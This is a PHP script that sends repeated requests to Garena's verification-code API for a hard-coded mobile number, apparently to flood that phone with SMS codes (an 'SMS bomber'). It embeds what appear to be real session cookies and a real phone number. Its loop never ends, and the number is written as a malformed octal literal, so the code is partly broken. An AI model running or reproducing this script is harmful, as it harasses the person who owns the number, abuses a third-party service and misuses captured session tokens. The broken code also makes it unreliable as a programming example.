<?php
$config['headers'] = explode("\n", "Host: account.garena.com:443
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Content-Type: application/json
Cookie: sso_key=c16188ce751cb1a28b052c271b5e1edfd418645263ed3a2aff3c8aaac6910800; ac_session=dpdff719vjbfowr6xk8bfwtstfgtdihl
Origin: https://account.garena.com
Referer: https://account.garena.com/security/mobile/apply
User-Agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Mobile Safari/537.36
X-DevTools-Emulate-Network-Conditions-Client-Id: 299D5927572F76C828DFE553551AF419");


$nomer = 085774946542;
$i = 0;
while($i < 10) {
echo curl($nomer)."<br>";
}

function curl($nomer) {
	global $config;
	$ar = json_encode(array("mobile_no" => $nomer));
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://account.garena.com/api/account/code/get");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
	$a = curl_exec($ch);
	curl_close($ch);

	return $a;
}
